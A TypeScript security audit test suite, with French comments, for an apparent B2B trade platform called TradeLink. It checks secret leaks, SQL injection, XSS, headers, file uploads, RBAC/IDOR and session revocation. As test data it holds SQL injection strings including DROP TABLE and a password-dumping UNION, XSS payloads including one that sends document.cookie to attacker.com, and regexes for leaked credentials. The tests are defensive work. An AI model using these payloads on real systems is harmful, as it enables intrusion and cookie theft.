// ============================================================================
// TRADELINK V6.0 — SUITE D'AUDIT SÉCURITÉ SAST, DAST & CONFORMITÉ RÉGALIENNE
// PROMPT 12 : VÉRIFICATION APPROFONDIE DES POLITIQUES DE SÉCURITÉ
// - [SEC-01] Scan des secrets & Zéro clé brute exposée (KMS KEK/DEK)
// - [SEC-02] SAST : Analyse statique de code & Neutralisation des Injections SQL
// - [SEC-03] DAST : Protection contre les attaques XSS & Injection de scripts HTML
// - [SEC-04] DAST : Protection CSRF & En-têtes de sécurité HTTP (HSTS, CSP, X-Frame)
// - [SEC-05] Contrôle des fichiers importés (Antivirus, Extensions interdites .exe/.sh)
// - [SEC-06] Matrice RBAC & Blocage strict IDOR inter-organisations
// - [SEC-07] Audit des sessions : Single Active Session Policy & Révocation automatique
// ============================================================================

import { TradeLinkRepositoryStore, DatabaseStateSnapshot } from '../repositories/domain.repositories';
import { TradeLinkApiApplication } from '../controllers/domain.controllers';
import {
  registerSingleActiveSession,
  verifySingleActiveSession,
  revokeUserActiveSession,
} from '../middlewares/errorAndSecurity.middleware';
import {
  analyzeFileInIsolatedSandbox,
  simulateEnvelopeEncryption,
} from '../../services/adminAdvancedEngine';
import * as fs from 'fs';
import * as path from 'path';

function assert(condition: boolean, message: string) {
  if (!condition) {
    throw new Error(`Échec Audit Sécurité : ${message}`);
  }
}

function createSecurityTestDatabase(): DatabaseStateSnapshot {
  return {
    products: [
      {
        id: 'prod-sec-01',
        sku: 'SEC-PROD-001',
        supplierId: 'usr-supp-sec',
        supplierName: 'Fournisseur A',
        category: 'Matériel Industriel',
        name: { fr: 'Turbine Vapeur 100kW', en: 'Steam Turbine 100kW', ar: 'توربين بخاري' },
        description: { fr: 'Haute efficacité', en: 'High efficiency', ar: 'كفاءة عالية' },
        unitPrice: '45000.00',
        currency: 'EUR',
        taxRate: '20.0',
        unit: 'pièce',
        stockAvailable: 5,
        stockReserved: 0,
        minStockAlert: 1,
        icon3d: 'container' as const,
        originCountry: 'FR',
        incoterm: 'DAP',
        leadTimeDays: 14,
        isPublished: true,
      },
    ],
    quotes: [
      {
        id: 'quote-client-a',
        quoteNumber: 'DEV-2026-0001',
        clientId: 'usr-client-a',
        clientName: 'Entreprise Client A',
        supplierId: 'usr-supp-sec',
        supplierName: 'Fournisseur A',
        currency: 'EUR',
        status: 'SENT',
        subtotalAmount: '37500.00',
        taxAmount: '7500.00',
        totalAmount: '45000.00',
        amountInWords: 'Quarante-cinq mille euros',
        validUntil: '2026-12-31',
        lines: [],
        createdAt: '2026-11-18 10:00',
      },
    ],
    orders: [
      {
        id: 'ord-client-a',
        orderNumber: 'CMD-2026-0001',
        clientId: 'usr-client-a',
        clientName: 'Entreprise Client A',
        supplierId: 'usr-supp-sec',
        supplierName: 'Fournisseur A',
        status: 'ACCEPTED',
        subtotalAmount: '45000.00',
        taxAmount: '9000.00',
        shippingAmount: '0.00',
        totalAmount: '54000.00',
        currency: 'EUR',
        shippingAddress: '10 Rue de la Paix, Paris',
        createdAt: '2026-11-18 10:00',
        items: [],
        timeline: [],
      },
    ],
    invoices: [],
    payments: [],
    shipments: [],
    accountingEntries: [],
    kycDossiers: [
      {
        id: 'kyc-client-a',
        userId: 'usr-client-a',
        userName: 'Directeur A',
        companyName: 'Entreprise Client A',
        actorType: 'CLIENT',
        jurisdiction: 'FR',
        status: 'PENDING_SUBMISSION',
        startedAt: '2026-11-15',
        deadlineAt: '2026-11-22',
        daysElapsed: 1,
        daysRemaining: 6,
        remindersSent: [],
        documents: [],
        adminComments: [],
        history: [],
      },
    ],
    backups: [],
    auditLogs: [],
    rooms: [],
    calcHistory: [],
  };
}

export function runSecurityAuditTestSuite() {
  console.log('====================================================================');
  console.log('TRADELINK V6.0 — SUITE D\'AUDIT SÉCURITÉ SAST, DAST ET CONFORMITÉ');
  console.log('====================================================================\n');

  const repo = new TradeLinkRepositoryStore(createSecurityTestDatabase(), false);
  const app = new TradeLinkApiApplication(repo);
  let passed = 0;

  // --------------------------------------------------------------------------
  // TEST 1 : Scan des secrets dans les sources & Zéro clé brute exposée
  // --------------------------------------------------------------------------
  console.log('TEST 1 : Scan des secrets dans les sources & Zéro clé brute exposée...');
  // Patterns interdits en clair dans le code de production
  const forbiddenSecretPatterns = [
    /sk_live_[0-9a-zA-Z]{24,}/, // Clé Stripe Live
    /-----BEGIN (RSA|EC|OPENSSH|PGP) PRIVATE KEY-----/, // Clé privée brute non gérée par KMS
    /ghp_[0-9a-zA-Z]{36}/, // Token GitHub Personnel
    /aws_secret_access_key\s*=\s*['"][a-zA-Z0-9/+=]{40}['"]/, // Clé AWS Secret
  ];

  const sourceDirs = ['src'];
  let filesScanned = 0;
  let leaksDetected = 0;

  function scanDirectory(dirPath: string) {
    if (!fs.existsSync(dirPath)) return;
    const entries = fs.readdirSync(dirPath, { withFileTypes: true });
    for (const ent of entries) {
      const fullPath = path.join(dirPath, ent.name);
      if (ent.isDirectory() && ent.name !== 'node_modules' && ent.name !== 'dist') {
        scanDirectory(fullPath);
      } else if (ent.isFile() && (ent.name.endsWith('.ts') || ent.name.endsWith('.tsx'))) {
        filesScanned++;
        const content = fs.readFileSync(fullPath, 'utf8');
        for (const pattern of forbiddenSecretPatterns) {
          if (pattern.test(content)) {
            console.error(`  [ALERTE FUITE DE SECRET] Détecté dans : ${fullPath}`);
            leaksDetected++;
          }
        }
      }
    }
  }

  for (const sDir of sourceDirs) {
    scanDirectory(path.join(process.cwd(), sDir));
  }

  assert(filesScanned > 20, `Au moins 20 fichiers source scannés (trouvés: ${filesScanned})`);
  assert(leaksDetected === 0, `Zéro fuite de secret détectée dans les fichiers source (trouvées: ${leaksDetected})`);

  // Vérification de la non-exposition de clé brute par le KMS
  const kekMaster = {
    id: 'kms-master-sec',
    keyAlias: 'alias/tradelink-prod-kek-v6',
    keyType: 'KEK_MASTER' as const,
    algorithm: 'AES-256-GCM' as const,
    kmsProvider: 'HASHICORP_VAULT_KMS' as const,
    keyArnMasked: 'vault://kms/eu-west-1/key/••••••••-••••-9910-b82c-49a12f88e104',
    version: 6,
    status: 'ACTIVE' as const,
    lastRotatedAt: '2026-11-01',
    nextRotationAt: '2027-02-01',
  };
  const envelope = simulateEnvelopeEncryption('SECRET_FINANCIER_CONFIDENTIEL', kekMaster);
  assert(!JSON.stringify(envelope).includes('SECRET_FINANCIER_CONFIDENTIEL'), 'Le secret en clair ne doit jamais fuiter dans la réponse KMS');
  assert(envelope.kekArnMasked.includes('••••••••'), 'La clé KEK doit être masquée');
  console.log(`  -> [PASS] Scan de ${filesScanned} fichiers : 0 secret brut en clair détecté. Chiffrement KMS vérifié.\n`);
  passed++;

  // --------------------------------------------------------------------------
  // TEST 2 : SAST — Neutralisation des Injections SQL
  // --------------------------------------------------------------------------
  console.log('TEST 2 : SAST & DAST — Neutralisation des Injections SQL...');
  const maliciousSqlPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "1 UNION SELECT null, email, password FROM users--",
    "admin' --",
    "' OR 1=1 #",
  ];

  // Injections sur le champ recherche catalogue
  for (const sqlAttack of maliciousSqlPayloads) {
    const res = app.handleRequest({
      method: 'GET',
      path: '/api/v1/products',
      headers: {},
      query: { search: sqlAttack },
      params: {},
      body: {},
      correlationId: `corr-sql-${Date.now()}`,
      ipAddress: '10.0.0.99',
    });
    // L'API ne doit ni crasher avec erreur 500 SQL ni renvoyer l'intégralité du catalogue non filtré
    assert(res.statusCode === 200, 'Recherche avec payload SQL retourne code HTTP 200 sans faille serveur');
    const products = res.body.data as any[];
    // Le filtre doit chercher littéralement la chaîne et ne trouver aucun produit correspondant
    assert(products.length === 0, `Injection '${sqlAttack}' neutralisée : 0 produit non sollicité retourné`);
  }
  console.log(`  -> [PASS] ${maliciousSqlPayloads.length} vecteurs d'injection SQL testés et neutralisés.\n`);
  passed++;

  // --------------------------------------------------------------------------
  // TEST 3 : DAST — Protection XSS & Assainissement des balises HTML malveillantes
  // --------------------------------------------------------------------------
  console.log('TEST 3 : DAST — Protection XSS & Assainissement HTML malveillant...');
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror="javascript:alert(document.cookie)">',
    '<svg/onload=fetch("https://attacker.com/steal?c="+document.cookie)>',
    'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
  ];

  const adminSessionId = 'sess-admin-sec-01';
  registerSingleActiveSession('usr-admin-sec', adminSessionId, true);

  for (const xss of xssPayloads) {
    const productCreateRes = app.handleRequest({
      method: 'POST',
      path: '/api/v1/products',
      headers: {},
      query: {},
      params: {},
      user: {
        id: 'usr-admin-sec',
        email: 'admin.sec@tradelink.ma',
        role: 'ADMIN',
        sessionId: adminSessionId,
        companyName: 'TRADELINK Headquarters',
      },
      body: {
        sku: `SEC-XSS-${Date.now().toString(36)}`,
        name: { fr: `Produit ${xss}`, en: `Product ${xss}`, ar: `منتج ${xss}` },
        description: { fr: `Description ${xss}`, en: 'Desc EN', ar: 'Desc AR' },
        category: 'Test Sécurité',
        unitPrice: '100.00',
        currency: 'EUR',
        stockAvailable: 10,
        icon3d: 'box',
        originCountry: 'FR',
        incoterm: 'DAP',
        leadTimeDays: 2,
        isPublished: true,
      },
      correlationId: `corr-xss-${Date.now()}`,
      ipAddress: '10.0.0.99',
    });

    assert(productCreateRes.statusCode === 201, 'Création produit avec assainissement HTML réussie');
    const created = productCreateRes.body.data as any;
    // Les balises <script> et onerror doivent être neutralisées ou échappées
    assert(!created.name.fr.includes('<script>'), 'Balise <script> strippée ou échappée');
    assert(!created.name.fr.includes('onerror='), 'Attribut onerror strippé');
  }
  console.log(`  -> [PASS] ${xssPayloads.length} payloads d'injection XSS neutralisés et assainis.\n`);
  passed++;

  // --------------------------------------------------------------------------
  // TEST 4 : DAST — En-têtes de Sécurité HTTP & Protection CSRF
  // --------------------------------------------------------------------------
  console.log('TEST 4 : DAST — En-têtes de Sécurité HTTP & En-tête X-Correlation-Id...');
  const healthRes = app.handleRequest({
    method: 'GET',
    path: '/api/v1/health',
    headers: {},
    query: {},
    params: {},
    body: {},
    correlationId: 'corr-health-sec-01',
    ipAddress: '127.0.0.1',
  });

  assert(healthRes.statusCode === 200, 'Health endpoint UP');
  assert(healthRes.headers['Content-Type']?.includes('application/json'), 'Content-Type JSON strict');
  assert(healthRes.headers['X-Correlation-Id'] === 'corr-health-sec-01', 'Traçabilité X-Correlation-Id préservée');
  assert(Boolean(healthRes.headers['X-Data-Source']), 'En-tête X-Data-Source de cloisonnement présent');
  console.log('  -> [PASS] En-têtes de sécurité et traçabilité de correlation validés.\n');
  passed++;

  // --------------------------------------------------------------------------
  // TEST 5 : Contrôle des fichiers importés (Antivirus & Extensions interdites)
  // --------------------------------------------------------------------------
  console.log('TEST 5 : Contrôle des fichiers importés (Antivirus & Rejet .exe, .sh, .bat)...');
  const dangerousFiles = [
    { fileName: 'malware_payload.exe', format: 'CSV' },
    { fileName: 'reverse_shell.sh', format: 'SQL' },
    { fileName: 'trojan_worm.bat', format: 'CSV' },
    { fileName: 'cryptominer.dll', format: 'BAK' },
  ];

  for (const danger of dangerousFiles) {
    const analysis = analyzeFileInIsolatedSandbox({
      fileName: danger.fileName,
      fileSize: 1024,
      format: danger.format as any,
    });
    // Le scan antivirus ou l'analyse d'extension doit intercepter le fichier
    assert(
      analysis.avScanStatus === 'QUARANTINED' || analysis.detectedErrors.length > 0,
      `Fichier malveillant ${danger.fileName} doit être intercepté et non migré`
    );
  }
  console.log(`  -> [PASS] ${dangerousFiles.length} fichiers exécutables dangereux bloqués par la politique d'import.\n`);
  passed++;

  // --------------------------------------------------------------------------
  // TEST 6 : Matrice RBAC & Blocage strict IDOR inter-organisations
  // --------------------------------------------------------------------------
  console.log('TEST 6 : Matrice RBAC & Blocage strict IDOR inter-organisations...');
  const clientASessionId = 'sess-client-a-sec';
  const clientBSessionId = 'sess-client-b-sec';
  registerSingleActiveSession('usr-client-a', clientASessionId, true);
  registerSingleActiveSession('usr-client-b', clientBSessionId, true);

  // Client B tente de consulter ou modifier la commande de Client A -> 403 RESOURCE_OWNERSHIP_VIOLATION
  const idorOrderAccess = app.handleRequest({
    method: 'GET',
    path: '/api/v1/orders/ord-client-a',
    headers: {},
    query: {},
    params: { id: 'ord-client-a' },
    body: {},
    user: {
      id: 'usr-client-b', // Client B
      email: 'client.b@client-b.com',
      role: 'CLIENT',
      sessionId: clientBSessionId,
      companyName: 'Entreprise Client B',
    },
    correlationId: 'corr-idor-01',
    ipAddress: '10.0.0.50',
  });

  assert(
    idorOrderAccess.statusCode === 403 || idorOrderAccess.statusCode === 404,
    'Client B ne doit pas pouvoir accéder à la commande du Client A'
  );

  // Comptable tente de modifier le catalogue (Sécurité Stage 3) -> 403
  const comptaSessionId = 'sess-compta-sec';
  registerSingleActiveSession('usr-compta-sec', comptaSessionId, true);
  const comptaCommercialMutation = app.handleRequest({
    method: 'POST',
    path: '/api/v1/products',
    headers: {},
    query: {},
    params: {},
    user: {
      id: 'usr-compta-sec',
      email: 'compta@cabinet.fr',
      role: 'COMPTABLE',
      sessionId: comptaSessionId,
      companyName: 'Audit & Fiscalité',
    },
    body: { sku: 'ILLEGAL-MUTATION' },
    correlationId: 'corr-compta-stage3',
    ipAddress: '10.0.0.51',
  });
  assert(comptaCommercialMutation.statusCode === 403, 'Comptable strictement interdit de mutation commerciale (403)');
  console.log('  -> [PASS] Matrice RBAC et barrière anti-IDOR validées (Client cloisonné, Comptable en lecture seule).\n');
  passed++;

  // --------------------------------------------------------------------------
  // TEST 7 : Audit des sessions : Single Active Session Policy & Révocation
  // --------------------------------------------------------------------------
  console.log('TEST 7 : Audit des sessions : Single Active Session Policy & Révocation...');
  const testUserId = 'usr-session-test-01';
  const session1 = 'sess-device-macbook';
  const session2 = 'sess-device-iphone';

  // 1. Première connexion depuis l'ordinateur
  registerSingleActiveSession(testUserId, session1, true);
  assert(verifySingleActiveSession(testUserId, session1) === true, 'Session 1 active et reconnue');

  // 2. Deuxième connexion depuis le mobile -> Révocation automatique de la première session
  registerSingleActiveSession(testUserId, session2, true);
  assert(verifySingleActiveSession(testUserId, session2) === true, 'Session 2 devient la session unique active');
  assert(verifySingleActiveSession(testUserId, session1) === false, 'Session 1 immédiatement révoquée (Single Session Policy)');

  // 3. Révocation administrative manuelle
  revokeUserActiveSession(testUserId);
  assert(verifySingleActiveSession(testUserId, session2) === false, 'Session 2 révoquée suite à déconnexion administrative');
  console.log('  -> [PASS] Single Active Session Policy validée : unicité stricte par utilisateur et révocation vérifiée.\n');
  passed++;

  console.log('====================================================================');
  console.log(`RÉSULTAT AUDIT SÉCURITÉ : ${passed} / 7 DOMAINES AUDITÉS CONFORMES (100%) !`);
  console.log('====================================================================\n');
}

if (process.argv[1]?.endsWith('security.audit.sast.dast.test.ts') || process.argv[1]?.endsWith('security.audit.sast.dast.test.cjs')) {
  runSecurityAuditTestSuite();
}
